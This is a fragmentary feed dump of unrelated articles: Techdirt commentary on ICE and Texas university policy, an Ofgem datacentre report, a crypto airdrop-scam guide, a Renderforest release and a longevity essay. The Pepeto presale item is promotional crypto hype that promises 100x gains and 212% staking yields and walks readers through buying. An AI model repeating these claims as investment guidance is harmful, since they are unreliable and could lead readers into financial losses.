href=\"https://www.techdirt.com/2026/02/19/cbs-decides-that-not-airing-associates-of-sex-trafficking-pedophiles-would-be-woke/\">all been witnessing over at CBS</a> (and know from years of watching Ellison’s nonexistent ethics at Oracle). Strange days, strange bedfellows.</p>",

From a report: Ofgem said about 140 proposed datacentre schemes, driven by use of artificial intelligence, could require 50 gigawatts of electricity -- 5GW more than the country's current peak demand. \n\nThe figure was revealed in an Ofgem consultation on demand for new connections to the power grid. It pointed to a \"surge in demand\" for connection applications between November 2024 and June last year, with a significant number coming from datacentres. This has exceeded even the most ambitious forecasts. \n\nMeanwhile, new renewable energy projects are not being connected to the grid at the pace they are being built to help meet the government's clean energy targets by the end of the decade. Ofgem said the work required to connect surging numbers of datacentres could mean delays for other projects that are \"critical for decarbonisation and economic growth.\" Datacentres are the central nervous system of AI tools such as chatbots and image generators, playing a vital role in training and operating products such as ChatGPT and Gemini.",

      "date": 1771963585,

      "unread": true,
      "content": "<p>\\\nYou can always find some legitimately free tokens in crypto, because some projects decide to give them away as a marketing tool or rewards of some kind. That’s called an airdrop: users (especially early adopters) can receive a portion of the tokens minted by that platform. So… free money! Scammers know this, of course, and that’s how malicious airdrops came to be as well.</p><p>\\\n<strong>These cybercriminals prepare their own fake crypto giveaways to trick people into sending them funds, personal data, or private keys</strong>. At the promise of free money in a familiar process, like an airdrop, a crypto investor could be quickly deceived. Let’s learn more about this.</p><h2>What a Crypto Airdrop Should Look Like</h2><p>\\\nFirst of all, a legitimate crypto airdrop , in places that match the project’s history, such as a verified website or long-running social accounts. There’s context, timing, and a reason for it. Maybe the project launched a new feature, maybe early users get a reward, maybe governance participation is the goal. None of this rushes, there's no urgency for anyone. Something like the one below.</p><p>\\\nNow,  has its own conditions. Signing up or sharing a post on social media are common requests. Sometimes, your past actions are enough (like buying early). The team will take a snapshot of the involved ledger to list the wallets that qualify for the airdrop. Then, on a later date, they’ll distribute the tokens automatically. Users won’t be asked to do big things, really.</p><p>\\\n<strong>And this is very important: no secrets are requested. No personal data. No private key. No strange form that wants full wallet access. There's NO suspicious \"customer support\" on your DMs.</strong> A legitimate airdrop trusts that wallets work as designed. It sends tokens or asks for a simple claim transaction, nothing more. When a campaign feels transparent and dull, that’s a good sign.</p><h2>Red Flags to Spot Fake Airdrops</h2><p>\\\nMalicious airdrops tend to share habits, and once we notice them, they become hard to ignore. Official channels from that project won’t show any announcements about it, to begin with. If there’s a website involved, the URL could look weird (at least one wrong character is a no-go). On social media, the account is either not related to the project at all, or, if they try to imitate the brand, the handle will be different too —for instance, ‘@Obite’ instead of ‘@Obyte’.</p><p><strong>Another classic move is urgency, where messages push to act right now, warning about missing rewards or losing access.</strong> Pressure is a great way to shut down careful thinking. Calm, legitimate projects don’t shout or rush people, while scammers almost always do. Besides, if a so-called \"free\" airdrop asks for a transfer to unlock rewards, the story ends there, because free means free, no exceptions. The same applies to forms or pop-ups asking for private keys or similar sensitive data.</p><p>\\\nWebsites tell stories too, and not only URLs. Fake pages often copy real ones but sneak in tiny spelling changes, broken links, or unfamiliar layouts. Social proof can be staged as well, with rows of cheerful comments from empty or brand-new profiles that add noise but not trust. One strange detail can be a mistake, but when several of these signs line up, they form a pattern that should make you walk away.</p><h2>\\n Practical Steps to Verify and Stay Safe</h2><p>Before even trying to participate in any airdrop, it helps to pause and run a quick reality check. Do Your Own Research (). Always DYOR!</p><ul><li><p><strong>Check whether the announcement appears on the project’s official channels and matches their past tone and timing</strong>. By the way, we offered some airdrops in the past on Obyte, but they already ended.</p></li><li><p><strong>Use a separate wallet for experiments, so a bad click won’t drain long-term funds</strong>. In Obyte, you can set up an  to keep most of your funds safe.</p></li></ul><ul><li><p><strong>Inspect links carefully, character by character</strong>, and avoid shortened URLs that hide their destination.</p></li><li><p><strong>Look for basic project details such as documentation</strong>, team presence, and community discussion beyond a single post.</p></li><li><p><strong>If someone contacts you via DM, that’s an immediate red flag</strong>. Don’t engage, let alone follow their instructions.</p></li></ul><p>The crypto space rewards patience more than impulses. Airdrops can be fun surprises, but safety comes from treating every surprise like a stranger knocking on the door with a mysterious gift. We don’t have to open it just because it’s wrapped in bright paper.</p><p>:::info\nFeatured Vector Image by </p>",

Being a relative moderate in a sea of anti-migrant extremists just means Homan’s probably headed for a demotion or dismissal himself. </p><blockquote><p><em>On Feb. 6, [Minnesota Supreme Court Chief Justice Natalie] Hudson met with Homan and ICE St. Paul field office Director Sam Olson to make several requests of the federal government including: that ICE no longer conduct operations inside Minnesota courthouses; that if they need to operate inside a courthouse they do it in “low-traffic areas” and not inside courtrooms; that ICE agents not bring long guns into courthouses; that ICE coordinate with local sheriff’s offices before conducting operations at or near courthouses; and that ICE provide a local point of contact to improve communication with the courts.</em></p><p><em>Hudson’s requests were largely accepted, according to Kyle Christopherson, spokesperson for the Minnesota Judicial Branch, who confirmed details of the meeting and the agreement.</em></p><p><em>Homan and Olson made several commitments, including to conduct future operations outside of courthouses, “unless safety requires officers to enter,” and that Olson would serve as a local point of contact for the courts with federal agents. Homan agreed that ICE agents would not make arrests inside courtrooms and that it was not ICE policy to bring long guns into courthouses.</em></p></blockquote><p>Any government agency not beholden to racist asshats <a href=\"https://www.techdirt.com/2025/07/08/denaturalization-fines-and-denying-reality-heres-how-trump-is-accelerating-mass-deportation/\" data-type=\"link\" data-id=\"https://www.techdirt.com/2025/07/08/denaturalization-fines-and-denying-reality-heres-how-trump-is-accelerating-mass-deportation/\">like Stephen Miller</a> and his “3,000 arrests per day” quota would have accepted this compromise in good faith, especially when the agreement was made in secret, preventing anyone from portraying it as a partisan win or loss. Tom Homan and his underlings wouldn’t lose face and the sanctity of courthouses would be respected as they almost always had been prior to Trump’s second term. </p><p>Almost immediately, it was made clear that it’s a waste of time to treat the administration like an adult. </p><p>18-year-old Herrera Berrios was the person detained by ICE officers, in an obvious violation of this agreement between the state Supreme Court justice and ICE officials. Berrios was chased through the courthouse before being tackled and cuffed on the lawn. After this happened, the government argued Berrios was subject to removal under Title 8 immigration law. That didn’t impress the presiding judge in Berrios’s case, who not only ordered his release, but criticized the government for its lack of a judicial warrant, as well as its attempt to use a law that applies to people “arriving” in the US to punish someone who had already been here for three years. </p><p>Berrios was in court to make an appearance <a href=\"https://www.startribune.com/federal-agents-make-a-chaotic-arrest-at-downtown-minneapolis-courthouse-amid-swarm-of-lawyers-observers/601579880\" data-type=\"link\" data-id=\"https://www.startribune.com/federal-agents-make-a-chaotic-arrest-at-downtown-minneapolis-courthouse-amid-swarm-of-lawyers-observers/601579880\">after being charged with first-degree drug possession</a>. These are still just allegations. Berrios otherwise has no criminal record. That means the pursuit and detainment here was performed just because the government wanted to, not because it  to. And none of that backs up the claims made by <a href=\"https://www.politico.com/news/2026/02/17/dhs-spokesperson-tricia-mclaughlin-to-leave-trump-administration-00783378?utm_medium=email&amp;utm_source=substack\" data-type=\"link\" data-id=\"https://www.politico.com/news/2026/02/17/dhs-spokesperson-tricia-mclaughlin-to-leave-trump-administration-00783378?utm_medium=email&amp;utm_source=substack\">the now-former</a> front mouth for the DHS, Tricia McLaughlin.</p><blockquote><p><em>Tricia McLaughlin, the assistant secretary for the Department of Homeland Security, called Frank an activist judge appointed by former President Bill Clinton who had “released a criminal with drug charges back onto American communities.”</em></p></blockquote><p>Drug charges? Yes. Criminal? Well, Berrios never received his day in court, so it’s a stretch to call someone still presumed innocent a “criminal” when all they’re facing are the government’s unproven allegations. And if you’re just as opportunistically stupid as McLaughlin, you could pretend this refers to Berrios’ undocumented status. But that would be like claiming an “activist judge” released a “criminal with drug charges” when the person being released was behind on their property taxes. Being undocumented is a  violation, not a  violation, even if both refer to things that are against the law.</p><p>But this isn’t about what Berrios did or didn’t do. If he was a criminal, then evasion and eventual arrest are just part of that process. But ICE specifically promised a state justice sitting at the  of the state’s court system that it  do this sort of thing. And then it went out and did it anyway, less than a week after making that promise. The government is supposed to hold itself to a higher standard. Under Trump, it refuses to hold itself to any standard at all, which is making it exceedingly clear the usual “checks and balances” stuff just isn’t going to get the job done. </p>",

A 2014 study of 3,000 university students found they were off-task on their machines nearly two-thirds of the time. Fortune reported back in 2017 that Maine's own test scores hadn't budged in the 15 years since the program launched, and then-governor Paul LePage called it a \"massive failure.\" Horvath framed the generation's eroding capabilities not as a personal failure but a policy one, calling them victims of a failed pedagogical experiment.",

      "content": "<p>Crypto hedge funds just did something they have never done before. According to , some major funds now report zero exposure to Bitcoin and Ethereum. Not reduced. Zero. Cash balances hit levels not seen since early 2025.</p><p>But anyone who reads that as a death sentence for crypto has not been paying attention. This is the reload phase. The exact same playbook these funds ran before every major crypto rally in the past decade. Go to cash. Wait for fear to peak. Then deploy into the highest conviction setups at the lowest possible prices. According to , Bitcoin ETFs saw $4.5 billion in outflows since January. That sounds scary until you realize the February 2025 outflow streak of $5 billion was followed by Bitcoin rallying past $100,000 within months. The playbook repeats because it works.</p><p>And here is the part the headlines miss. Capital is not leaving crypto. It is repositioning. Solana ETFs pulled in $13.9 million last week while BTC and ETH bled. Presale participation hit 2026 highs during the drawdown. Funds are hunting for the best crypto to invest in 2026 at ground floor prices. Pepeto just crossed $7.2 million raised with three product demos live, and the math keeps getting harder to ignore.</p><h2>Why This Crypto Drawdown Is an Accumulation Gift, Not a Warning Sign</h2><p>Crypto has gone through this exact cycle seven times and recovered stronger every single time. The 2018 crash. The 2020 COVID liquidation. The 2022 FTX implosion. Each one felt like the end. Each one created the richest group of new millionaires when the recovery came. According to , presale inflows surged to 2026 weekly highs during this drawdown. That means the people who have been through these cycles before are buying, not running. The best crypto to invest in 2026 will not be the one at its all time high. It will be the one accumulating capital now while everyone else waits for permission.</p><h2>Pepeto: The Crypto Presale Accumulating Through the Fear With Real Products Behind It</h2><p>Three working demos live today. PepetoSwap handles cross chain meme coin trading. A bridge moves tokens between fragmented ecosystems. A zero fee exchange routes every transaction through $PEPETO at the protocol level. That is structural demand built into the code itself.</p><p>SolidProof and Coinsult completed dual crypto security audits. Zero percent tax. Created by one of the original Pepe coin founders who built a $7 billion movement. Over $7.2 million raised at $0.000000185. Insider sources report a major exchange listing announcement is being prepared as the product suite nears full readiness.</p><p>The meme coin sector commands $45 billion. Not one crypto project built dedicated trading infrastructure before Pepeto. At $0.000000185, 100x needs just $50 million market cap. SHIB hit $40 billion with zero products. PEPE reached $7 billion on memes alone. None had a swap, bridge, exchange, or audits. Staking at 212 percent APY compounds daily. A $5,000 position generates $10,700 yearly. But staking is the bonus. The real thesis is owning six zero crypto infrastructure before the reload money finishes repositioning.</p><p>Pepeto ($PEPETO) is an Ethereum based meme coin currently in presale at $0.000000185 per token. The official and only legitimate way to buy Pepeto is through the project website at pepeto.io. Here is exactly how to buy Pepeto in three simple steps.</p><p>Step 1: Create a crypto wallet. For desktop, download MetaMask from metamask.io. For mobile, download Best Wallet from your app store. If you already have a MetaMask, Trust Wallet, or any other Ethereum compatible wallet, skip to Step 2.</p><p>Step 2: Fund your wallet with crypto. Send ETH (Ethereum), USDT (Tether), or BNB (Binance Coin) to your wallet address. These are the three cryptocurrencies accepted by the Pepeto presale. If you prefer to pay by credit or debit card, you can skip this step and pay directly in Step 3.</p><p>Step 3: Visit pepeto.io and buy $PEPETO. Go to , click Connect Wallet, select your payment method (ETH, USDT, BNB, or Card), enter the amount of $PEPETO tokens you want to purchase, then click Buy to complete your purchase. You can also click Buy and Stake to automatically stake your tokens at 212% APY for maximum gains.</p><p>After buying, your $PEPETO tokens will appear in your connected wallet once the presale ends and tokens are distributed. Staked tokens earn 212% APY rewards that compound daily.</p><h2>Important Safety Warning: How to Verify the Real Pepeto Presale</h2><p>Several fake tokens and copycat projects have appeared using the Pepeto name on various blockchains. These are scams and are not affiliated with the real Pepeto project. The only legitimate Pepeto presale runs exclusively at . Always verify the URL in your browser says pepeto.io before connecting your wallet. Do not trust links from unofficial Telegram groups, social media impersonators, or random DMs. If someone sends you a contract address claiming to be Pepeto, verify it at pepeto.io first.</p><h3>How do I buy Pepeto token?</h3><p>Go to pepeto.io, connect MetaMask or Best Wallet, choose ETH, USDT, BNB or card payment, enter the amount, and click Buy or Buy and Stake. The presale price is $0.000000185 per $PEPETO token.</p><h3>What is the best crypto to invest in 2026?</h3><p>Pepeto at $0.000000185 offers three working product demos, dual audits from SolidProof and Coinsult, and 212% staking APY. A 100x requires just $50 million market cap versus SHIB's $40 billion peak with zero products.</p><p>Pepeto has dual audits from SolidProof and Coinsult, was created by a Pepe cofounder, and raised over $7.2 million. Only buy at the official site pepeto.io and beware of fake copycat tokens on other platforms.</p><h3>What wallet do I need to buy Pepeto?</h3><p>MetaMask (desktop) or Best Wallet (mobile) are recommended. Any Ethereum compatible wallet works. The Pepeto presale at pepeto.io accepts ETH, USDT, BNB, and credit or debit card payments.</p><p>:::warning\nThis article is for informational purposes only and does not constitute investment advice.

      "content": "<p><strong>Byline: TBD by the Network</strong></p><p><strong><em>Photo Courtesy of Renderforest</em></strong></p><p> now functions as a primary production system inside agencies and marketing teams planning campaigns through 2026. Teams face shorter timelines, tighter budgets, and stricter review cycles. Visual work reaches clients faster and faces heavier scrutiny. Under those conditions, platforms earn trust through reliability, speed, and repeatable results. Renderforest fits that role by giving teams a single place to produce video, branding assets, and web-ready visuals without extended production cycles.</p><p>Agency leaders describe daily friction created by disconnected tools and rising external production costs. Renderforest reduces that friction by consolidating common creative tasks into one environment. Work moves from draft to delivery with fewer handoffs. Visual output stays consistent across formats. Campaign schedules hold without added staffing or studio overhead.</p><h2>Production Scale Without Studio Overhead</h2><p>Agency teams once depended on large production units to deliver explainers, promos, and social clips. Those units required time, coordination, and fixed cost. Renderforest allows smaller teams to publish work that appears complete and client-ready. Templates cover logos, motion graphics, mockups, and full videos. Visual elements stay aligned across assets, which protects brand continuity throughout a campaign cycle.</p><p>Speed matters most during review. Teams often finalize assets within hours rather than days. Feedback cycles shorten. Revisions occur without meetings or external dependencies. Creative directors adjust layouts, preview results, and distribute files within the same workflow. Output maintains a finished look while timelines compress.</p><p>Renderforest removed public executive quotations in favor of product behavior. The platform prioritizes usability over display. Agencies report fewer bottlenecks. Freelancers retain control over delivery. Brands receive consistent visuals without added invoices or delays. \\n Strategic direction comes from long-term platform design rather than public commentary. The company is led by Narek Safaryan, CEO and Founder, whose focus is on building infrastructure that agencies rely on daily rather than on product positioning through executive visibility. That approach shows how Renderforest evolves. Updates prioritize workflow stability, scale, and speed over surface-level features. Agencies evaluate the platform based on delivery outcomes, not leadership soundbites, which aligns with how creative teams operate under pressure.</p><p>Brands now appear across many screens and formats. One off-brand asset weakens campaign trust. Renderforest addresses this risk through repeatable visual systems. Fonts, colors, and motion patterns remain consistent across assets, which reduces errors during fast production cycles.</p><p>Recognition improves when visual elements repeat with intent. A logo animation built early in a campaign remains suitable months later in a new product clip. Motion, color, and timing stay aligned, so campaigns read as coordinated rather than improvised. Consistency supports recall without drawing attention to the process.</p><p>Agency feedback follows a similar pattern. Junior staff deliver usable work sooner. Senior creatives spend more time on messaging rather than alignment fixes. Shared templates reduce friction between strategy and execution, which stabilizes output during high-volume periods.</p><h2>Renderforest 2.0 and Workflow Direction</h2><p>Renderforest recently released , a platform update focused on faster creation and improved automation inside the same production environment. The update centers on internal modeling developed by the company to reduce manual steps and speed delivery. Public documentation from Renderforest describes the update as a response to agency demand for quicker turnaround and fewer workflow interruptions. No external systems are required to access these changes.</p><p>Adoption patterns reflect usage rather than promotion. Teams incorporate Renderforest into daily routines. Drafts appear between meetings. Campaign assets update in near real time rather than weeks later. Planning for 2026 now favors platforms that keep pace with demand rather than slow delivery.</p><p>Budget behavior supports that shift. Agencies under margin pressure view Renderforest as cost control. In-house teams treat it as leverage when staffing remains flat. Clients focus on output quality and delivery speed rather than production method.</p><p>Renderforest reports more than thirty million users across nearly two hundred countries. That reach supports distributed teams working across regions. Shared assets move without technical barriers. Visual language remains consistent across markets, which supports brands operating at scale.</p><p>Marketing output continues to increase while attention narrows. Tools that slow production lose relevance. Renderforest maintains its position by supporting steady delivery under pressure and by fitting into existing agency routines without disruption.</p><p>:::tip\nThis story was distributed as a release by Jon Stojan under HackerNoon’s Business Blogging Program.</p>",

      "content": "<p>For the better part of a decade, conservative politicians—and Texas politicians in particular—have been absolutely  about the state of free speech on college campuses. You’ve heard the greatest hits: students are coddled snowflakes who can’t handle the real world, trigger warnings are destroying intellectual rigor, safe spaces are turning universities into daycare centers, and the real threat to America is that professors might have opinions that lean left.</p><p>Texas Governor Greg Abbott was so concerned about this supposed crisis that he signed a campus free speech bill in 2019. The whole thing was framed as a brave stand for open inquiry and the marketplace of ideas. As state Senator Joan Huffman <a href=\"https://www.texastribune.org/2019/04/02/university-texas-free-speech-on-campus/\">said at the time</a>:</p><blockquote><p><em>“Our college students, our future leaders, they should be exposed to all ideas, I don’t care how liberal they are or how conservative they are.”</em></p></blockquote><p>What a beautiful sentiment. Truly inspiring stuff.</p><blockquote><p><em>The University of Texas System’s Board of Regents unanimously approved Thursday a rule requiring its universities to ensure students can graduate without studying “unnecessary controversial subjects,” despite warnings it could leave them less prepared for the real world.</em></p><p><a href=\"https://www.texastribune.org/wp-content/uploads/2026/02/U.T.-System-Discussion-and-appropriate-action-related-to-The-University-of-Texas-System-Expectations-of-Academic-Integrity-and-Standards-for-Teaching-Controversial-Topics.pdf\"></a><em>also requires faculty to disclose in their syllabi the topics they plan to cover and adhere to the plan, and says that when courses include controversial issues, instructors must ensure a “broad and balanced approach” to the discussion.</em></p></blockquote><p>If you had described this policy to any Texas Republican in 2018 and told them a bunch of liberal professors had come up with it, they would have been on Fox News within the hour screaming about the death of Western civilization. The words “trigger warnings,” “safe spaces,” and “cancel culture” would have been deployed at machine-gun pace all surrounded with high-minded claims about “free speech” and “academic freedom.”</p><p>But when it’s governor-appointed regents doing it? When the people being “protected” from uncomfortable ideas are  students and donors rather than marginalized communities? Well, then it’s just good governance.</p><p>The truly revealing moment came from Board Chair Kevin Eltife, who was asked about the fact that the policy doesn’t bother to define what “controversial” means or what a “broad and balanced approach” actually looks like. His response should be printed on a plaque and hung in the Museum of Political Cowardice:</p><blockquote><p><em>“We are in difficult times,” he said. “Vagueness can be our friend.”</em></p></blockquote><p>Ah yes. Vagueness. The chairman of a board governing one of the nation’s largest public university systems—more than 260,000 students across nine campuses—is openly admitting that the  of the policy is that nobody knows what it means. He’s saying the quiet part loud: the vagueness is a , not a bug.</p><p>And of course it is. Because when you leave “controversial” undefined, you don’t need to go through the messy business of actually banning specific topics, which might allow everyone to call you out on your hypocrisy and highlight the subjects you hope to censor.</p><p>You just create a system where every professor has to wonder, before every lecture, whether today’s lesson is the one that gets them hauled before an administrator. The chilling effect does all the work for you.</p><p>As UT-Austin physics professor Peter Onyisi pointed out during public testimony:</p><blockquote><p><em>“Will they (administrators) be experts in the relevant disciplines or will they just seek to avoid unpleasant publicity?”</em></p></blockquote><p>We all know the answer to that question. When a policy gives administrators the power to decide what counts as “unnecessarily controversial” without any definition whatsoever, administrators are going to do what administrators always do: minimize risk. That means the most easily-offended person in the room—or more precisely, the most politically connected complainant—effectively gets a veto over what gets taught. It’s a heckler’s veto laundered through bureaucratic process.</p><p>There are legitimate debates about how universities should approach controversial material in the classroom. But any time anyone has brought any of those up for serious debate over the last few decades, they were mocked as “woke snowflakes” who need their “safe spaces” and “trigger warnings.”</p><p>This is the exact dynamic that conservatives spent years  to oppose. The whole argument against “political correctness” and “cancel culture” was supposedly that small groups of oversensitive people shouldn’t be able to dictate what ideas are permissible in public discourse. The argument against trigger warnings was that adults should be able to encounter difficult material without having their hands held. The argument against safe spaces was that the university should be a place of intellectual challenge, not comfort.</p><p>Now Texas has built a taxpayer-funded safe space spanning nine campuses and four medical centers, complete with government-mandated trigger warnings (the syllabus disclosure requirement) and an institutionalized process for anyone who finds course material too upsetting to lodge a complaint. How very snowflake of Texas. The only difference here is who gets to be upset.</p><p>And then there’s the “broad and balanced approach” requirement, which sounds perfectly reasonable until you think about it for more than three seconds. What does “balance” look like when you’re teaching about the Holocaust? About slavery? The “germ theory” of disease? If a history professor is covering Jim Crow, are they now required to present the segregationist perspective with equal weight in the name of “balance”?</p><p>That sounds absurd, and it is. When you refuse to define “controversial” and then mandate “balance” for anything that falls under that undefined umbrella, you’ve created a system where any topic with a political dimension—which is basically every topic in the humanities, social sciences, and increasingly the natural sciences—becomes a minefield. </p><blockquote><p><em>Allen Liu, policy counsel for the NAACP Legal Defense Fund, said it could lead to “viewpoint discrimination” and disproportionately affect Black students and faculty by discouraging teaching about slavery, segregation and other subjects central to Black history.</em></p></blockquote><p>To which, I would imagine, many of the UT Board of Regents would quietly admit among friends “well, yeah, that’s the fucking point.”</p><p>It’s also worth noting the broader context in which this is happening:</p><blockquote><p><em>The vote comes a week after UT-Austin announced it will</em><a href=\"https://www.texastribune.org/2026/02/12/texas-ut-austin-consolidate-race-gender/\"></a><em>its African and African Diaspora Studies, Mexican American and Latino Studies, American Studies, and Women’s, Gender and Sexuality Studies departments into a new Social and Cultural Analysis department. More than 800 students are pursuing majors, minors and graduate degrees in the affected programs.</em></p></blockquote><p>Ah yes. Basically anything that is not white European heterosexual male focused, all gets shoved into one “those other people over there” department.</p><p>Meanwhile, the school is absolutely  programs that align with a very particular set of priorities. See if you can figure out which ones:</p><blockquote><p><em>Last year, UT-Austin was also one of nine universities offered preferential access to federal funding in exchange for agreeing to ensure departments reflect a mix of perspectives and</em><strong><em>promote civic values and Western civilization</em></strong><em>, among other requirements.</em></p><p><em>Some students argue that even</em><a href=\"https://www.texastribune.org/2025/11/17/university-of-texas-trump-policy-changes-federal-funding/\"></a><em>the agreement, UT-Austin is already moving in that direction. Alfonso Ayala III, a doctoral student in Mexican American and Latina/o Studies at UT-Austin, pointed to the university expanding the conservative-backed School of Civic Leadership as his department loses autonomy.</em></p><p><em>“It’s hard to understand this as anything other than ideological and political,” Ayala said.</em></p></blockquote><p>And this is just the latest chapter in what has become a remarkable saga of Texas Republicans dismantling the very speech protections they once championed. As we <a href=\"https://www.techdirt.com/2025/06/13/texas-lawmakers-walk-back-campus-free-speech-law-because-its-letting-too-many-pro-palestinian-students-protest/\">wrote about last year</a>, that 2019 campus free speech law—the one that was supposed to ensure all viewpoints could be heard—suddenly became a problem when <em>pro-Palestinian protesters</em> started using it.</p><p>Texas Republicans couldn’t have that.</p><p>The original 2019 law was passed specifically because Texas A&amp;M had canceled a white nationalist rally and Texas Southern University had scrapped a conservative speaker’s appearance. The legislature was furious. Free speech must be protected!</p><p>But when the same protections enabled pro-Palestinian encampments, suddenly the legislature couldn’t pass restrictions fast enough. New rules on where you can protest, bans on amplification devices during class hours, prohibitions on overnight encampments, restrictions on wearing masks. All the things that were never a problem in the five years between the law’s passage and the moment students started saying things Texas Republicans didn’t want to hear.</p><p>So let’s trace the arc here. In 2019, the Texas legislature mandated that universities  allow protests and controversial speakers because free speech is sacred. In 2025, the Texas legislature rolled that back because the wrong people were speaking. And now in 2026, the UT Board of Regents is mandating that professors can’t even teach “unnecessarily controversial” material in their own classrooms—a phrase so deliberately vague that the board chair openly celebrates its ambiguity.</p><p>Senator Huffman, who authored the 2019 free speech law and proclaimed that students “should be exposed to all ideas,” voted in favor of restricting protest rights last year and appears to have raised no objection to the new UT policy. Let’s go out on a limb here and say it: the 2019 law was never about ensuring exposure to all ideas. It was about ensuring that a specific set of speakers (white nationalists) saying a specific set of things (racist shit) would have access to university campuses. Once the same mechanism started working for the “wrong” people, it became disposable.</p><p>The UT regents will tell you this policy is about “balance.” That it’s about making sure professors stick to their areas of expertise and don’t wander off into political editorializing. But if that were the actual concern, you’d write a clear, specific policy. You’d define your terms. You’d create transparent standards that professors could understand and follow. You would absolutely not describe your own vagueness as a strategic asset.</p><p>“Vagueness can be our friend” is what you say when the goal is discretionary power—the ability to punish the speech you don’t like while leaving the speech you do like untouched.</p><p>For all the years of rhetoric about snowflakes and safe spaces and the coddled minds of American youth, the actual policy goal was never intellectual rigor. It was control. Control over which ideas get aired, which histories get taught, which perspectives get treated as legitimate, and which get quietly filed under “unnecessarily controversial” and removed from the curriculum.</p><p>The people who spent a decade mocking trigger warnings just voted unanimously to impose the biggest trigger warning in the history of American higher education: <em>Warning: This university has been certified free of unnecessary controversy by the State of Texas.</em></p><p>I guess everything really is bigger in Texas. Including the censorship.</p>",

      "content": "<p>My dear reader, splendid news! You can stop dithering over whether to scrape by as a barista or a binman. The planet is recruiting. Positions for \"God\" have just opened up — and this isn't some metaphorical HR fluff. The practical phase is underway. The sole entry requirement? Immortality. All it takes is a casual ten billion in loose change to bag your spot in \"Olympus 2.0\".</p><p>No billions? Then do read on. It may, in its small way, help you come to terms with your distinctly mortal lot.</p><p>Take your time. Weigh it up honestly. Some of these questions prod at nerves so raw one hesitates to touch them. Yet touch them we must. The fantasy is no longer fantasy. By posing these apparently \"silly\" questions now, we might just stop the whole rickety edifice from toppling in an embarrassing heap.</p><p>A decade ago, immortality or radical life extension sounded like the ravings of basement-dwelling sci-fi nerds or wide-eyed transhumanist cultists. How wrong we were. We underestimated the sheer, icy determination of the old money and old power crowd. They may not boast many great thinkers, but they have cunning and will in industrial quantities. The moment biologists and cyberneticists produced anything promising, it was quietly scooped up by the right pair of iron fists.</p><p>Now we have the leaders of two superpowers murmuring about pushing lifespans to 150, while others muse over mind-uploading, cloning, and swapping brains like hard drives. The order for eternal life has been placed — and it's being fulfilled at warp speed. Ethics? Nobody asked.</p><p>For the rest of us, eternal life remains the stuff of ancient witchcraft. But the insiders have dropped the scepticism and are now doing proper cost-benefit sums. Make no mistake: this isn't for the great unwashed. We're talking about a handful of Very Important Individuals getting the upgrade. Why ever not? The planetary Olympus is already built. The gods sit enthroned, hurling thunderbolts at the malcontents. They simply lacked the staying power of the old Olympians. Toss in immortality and — voilà — they can finally rule forever.</p><h3><strong>The Hypocrisy of the \"Biological Spacesuit\"</strong></h3><p>It turns out that neither inherited nor embezzled billions, nor near-absolute power over millions, can quite banish the thought of the hearse pulling up. Under the TV lights they troop into cathedrals, light candles, swear on holy books. Yet they'd swap the promise of the hereafter for a few more decades here in a heartbeat.</p><p>By throwing their lot in with physical immortality, they either betray the very idea of the immortal soul — or, more brazenly, admit they never believed a word of it. This is a spiritual bankruptcy so complete it almost commands respect. The same elites who spent centuries propping up social order on religious dogmas (including divine judgment) are the first to bin them the instant a tech patch for death appears.</p><p>If they're this desperate to cling to their \"biological spacesuit\", it means they see nothing — absolute zilch — waiting beyond the meat. Metaphysical paupers at best; traitors at worst. The hypocrisy will out, and when it does, there will probably be blood. For now, though, the express steams on towards the buffers, cheerfully shunting the mummified corpses of old gods off the line.</p><h3><strong>The Technique: Building the Private Olympus</strong></h3><p>Today the world's sharpest minds toil in secret labs, bankrolled to infinity and beyond. Cloning, mind-uploading — every sci-fi cliché is on the table. We recently heard about ER-100 from Life Biosciences: not a supplement, but \"epigenetic reprogramming\" to wind back the cellular clock. Clinical trials got the nod in early 2026.</p><p>The line-up reads like a who's-who of hubris: Elon Musk's Neuralink, Sam Altman's Retro Biosciences, Jeff Bezos-backed Altos Labs (history's priciest start-up). Peter Thiel, high priest of anti-ageing, pours money into the Methuselah Foundation. Rumours of his young-blood transfusions (parabiosis) sound less like science and more like Gothic vampire oligarch fanfic. Meanwhile, Google's Ray Kurzweil assures us nanobots will be hoovering up cellular damage by the 2030s.</p><p>Politicians are scrambling to keep pace. \"Longevity\" is now a formal agenda item. Davos 2026 made the \"Longevity Economy\" a headline act. While they publicly fret about pension reform, the real action happens at closed-door \"Longevity Investors Lunches\" where the tech is divvied up for the elect.</p><p>One almost feels sorry for the scientists. At Madrid's CNIO, Maria Blasco and her team chase telomere secrets to beat cancer for all humanity — only for their breakthroughs to be repurposed as blueprints for private Elysiums. What should have been humanity's shared inheritance is being turned into the ultimate wedge for social fracture.</p><h3><strong>The End of the Universal Leveler</strong></h3><p>Death has always been the great leveller. Emperors and peasants alike got the same appointment. It reconciled the poor to the existence of the rich. Everyone carried a one-way ticket in their soul's inside pocket.</p><p>But if you can't reroute the train for everybody, why not pull the oldest trick in the book — simply cross your own name off the manifest? Modern tech has made the dodge credible. Let the plebs enjoy Chopin's Funeral March on repeat.</p><p>Human attachment to this world rests on the fear of leaving it. As Berdyaev put it: <em>the utopias of earthly paradise are built on denying immortality, on disbelief in it, on a greedy lust for this miserable scrap of life and its toys</em>. Religions have long used the next world as the ultimate disciplinary tool. Remove death, and you remove civilisation's brakes.</p><p>Extract that one stabilising element from the system and watch what happens. A citizen buries half his family over forty years, then sees the same politician — barely altered — still droning from the podium since his own youth. Thirty more years, the citizen will be dust, and the politician will still be droning.</p><p>\"Ah well,\" thinks the citizen, \"it's rotten, but we'll settle accounts There.\" And then… this.</p><p>\"A nice yarn,\" the reader may shrug, \"but you're surely exaggerating?\" I don't think so. The numbers don't lie. Over the last century we've gone from leaders dying in harness at a decent age to what can only be called biological secession.</p><p><strong><em>1920s–1950s: Biological Honesty</em></strong>. Leaders died of the same things as everyone else. Average exit age: 60–70 (Stalin, Lenin, Roosevelt). Death was egalitarian.</p><p><strong><em>1960s–1990s: Golden Stagnation.</em></strong> Elite medicine kicks in. Average: 75–83. The USSR's funeral-carriage relay (Brezhnev, Andropov, Chernenko) was nature's last mass outing.</p><p><strong><em>2000s–present: Biological Departure.</em></strong> Leader deaths are now statistical anomalies. Average: 90+. Carter (100+), Elizabeth II (96), Kissinger (100). We no longer worry they'll die too soon; we worry they'll never die at all.</p><p>This is medical apartheid. The elite has quietly ascended to a different biological plane and forgotten to tell the electorate. Biology, once the guarantor of power rotation, is now its preserver.</p><p>People may forgive ill-gotten riches. They will never forgive inequality in the right to life itself. Commodifying immortality will shred every last moral norm. The prospect of a few billion humans suddenly brake-free is properly horrifying.</p><p>The old gods are dead and buried. The new ones — Davos presidents and Silicon Valley immortals-in-waiting — are 